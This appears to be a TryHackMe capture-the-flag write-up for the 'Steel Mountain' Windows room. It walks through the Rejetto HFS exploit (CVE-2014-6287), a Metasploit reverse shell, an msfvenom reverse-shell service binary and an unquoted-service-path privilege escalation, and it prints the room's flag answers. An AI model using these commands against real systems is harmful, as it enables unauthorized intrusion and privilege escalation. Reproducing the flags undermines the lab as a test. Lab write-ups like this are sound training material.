# Steel Mountain

> **Source:** TryHackMe - Premium Room  
> **Tags:** #ctf #tryhackme #windows #metasploit #privilege-escalation #rejetto

---

## Challenge Description

Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access.

---

## Introduction

### Who is the employee of the month?

**Steps:**
1. Access the webserver using the target IP address
2. View the landing page to find "Employee of the Month"
3. View page source to identify image details
4. Image filename: `BillHarper.png`

**Answer:** Bill Harper

---

## Initial Access

### What is the other port running a web server on?

#### Nmap Scan 1 (Basic)
```bash
nmap 10.10.169.46
```

**Open Ports:**
- 80/tcp - http
- 135/tcp - msrpc
- 139/tcp - netbios-ssn
- 445/tcp - microsoft-ds
- 3389/tcp - ms-wbt-server
- 8080/tcp - http-proxy
- Multiple high ports (49152-49163)

#### Nmap Scan 2 (Detailed with Service Version)
```bash
nmap -p- 10.10.169.46 -sV
```

**Key Findings:**
- Port 80: Microsoft IIS httpd 8.5
- Port 8080: HttpFileServer httpd 2.3
- Port 5985: Microsoft HTTPAPI httpd 2.0
- OS: Windows Server 2008 R2 - 2012

**Answer:** 8080

---

### What file server is running?

**Steps:**
1. Browse to: `http://10.10.169.46:8080/`
2. Identify the web server

**Answer:** Rejetto HTTP File Server

---

### What is the CVE number to exploit this file server?

#### Method 1: Google Search
Quick search reveals the CVE

#### Method 2: Using Searchsploit
```bash
searchsploit -s rejetto http file server
```

**Results:**
- Rejetto HTTP File Server (HFS) - Remote Command Execution (Metasploit)
- Rejetto HTTP File Server (HFS) 2.3.x - Remote Command Execution

**View exploit details:**
```bash
searchsploit -x windows/remote/34668.txt
```

**Answer:** CVE-2014-6287

---

### Use Metasploit to get an initial shell. What is the user flag?

#### Open MSFConsole
```bash
msfconsole -q
```

#### Search for Rejetto exploit
```bash
msf6 > search rejetto
```

**Found Module:**
```
exploit/windows/http/rejetto_hfs_exec
```

#### Configure the exploit
```bash
msf6 > use exploit/windows/http/rejetto_hfs_exec
msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.169.46
msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
msf6 exploit(windows/http/rejetto_hfs_exec) > set SRVPORT 9090
msf6 exploit(windows/http/rejetto_hfs_exec) > set LHOST [Your IP]
msf6 exploit(windows/http/rejetto_hfs_exec) > set LPORT 4444
msf6 exploit(windows/http/rejetto_hfs_exec) > exploit
```

#### Post Exploit - Finding User Flag
```bash
meterpreter > cd C:\\Users\\bill\\Desktop
meterpreter > dir
meterpreter > cat user.txt
```

**Answer:** b04763b6fcf51fcd7c13abc7db4fd365

---

## Privilege Escalation

### Enumeration with PowerUp

**PowerUp Script:** Evaluates Windows machine for privilege escalation vectors

**Download:**
```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
```

#### Upload PowerUp to target
```bash
meterpreter > upload /path/to/PowerUp.ps1
```

#### Execute PowerUp
```bash
meterpreter > load powershell
meterpreter > powershell_shell
PS > . ./PowerUp.ps1
PS > Invoke-AllChecks
```

---

### What is the name of the service with unquoted service path vulnerability?

**PowerUp Output:**
```
ServiceName    : AdvancedSystemCareService9
Path           : C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe
ModifiablePath : @{ModifiablePath=C:\\; IdentityReference=BUILTIN\\Users}
StartName      : LocalSystem
CanRestart     : True
Check          : Unquoted Service Paths
```

**Key Findings:**
- CanRestart: True (we can restart the service)
- Directory is write-able
- Running as LocalSystem

**Answer:** AdvancedSystemCareService9

---

### What is the root flag?

#### Generate malicious payload
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=[Your IP] LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe
```

#### Replace legitimate service binary

**Target location:**
```
C:\\Program Files (x86)\\IObit\\Advanced SystemCare\\ASCService.exe
```

**Steps:**
1. Navigate to service directory
```bash
meterpreter > cd "C:\\Program Files (x86)\\IObit"
```

2. Upload malicious binary
```bash
meterpreter > upload /path/to/Advanced.exe
```

3. Start netcat listener (on attacking machine)
```bash
nc -nvlp 4443
```

4. Stop and restart service
```bash
meterpreter > shell
C:\\> sc stop AdvancedSystemCareService9
C:\\> sc start AdvancedSystemCareService9
```

5. Check netcat listener for shell

6. Navigate to Administrator desktop
```bash
C:\\> cd C:\\Users\\Administrator\\Desktop
C:\\> type root.txt
```

**Answer:** 9af5f314f57607c00fd09803a587db80

---

## Access Without Metasploit

### Alternative Method

**Exploit:** [CVE-2014-6287 Python Script](https://www.exploit-db.com/exploits/39161)

**Requirements:**
- Web server (to host netcat binary)
- Netcat listener
- Static netcat binary: [Download from GitHub](https://github.com/andrew-d/static-binaries/blob/master/binaries/windows/x86/ncat.exe)

**Process:**
1. Run exploit first time - pulls netcat to system
2. Run exploit second time - executes payload for callback
3. Use winPEAS for privilege escalation enumeration

---

## Key Takeaways

**Vulnerabilities Exploited:**
1. Rejetto HFS RCE (CVE-2014-6287)
2. Unquoted Service Path
3. Writable service directory
4. Service with restart permissions

**Tools Used:**
- Nmap
- Metasploit
- Meterpreter
- PowerUp.ps1
- Msfvenom
- Netcat

**Privilege Escalation Method:**
- Service binary replacement via unquoted service path

---

**Status:** Completed  
**Difficulty:** Easy-Medium  
**Last Updated:** {{date}}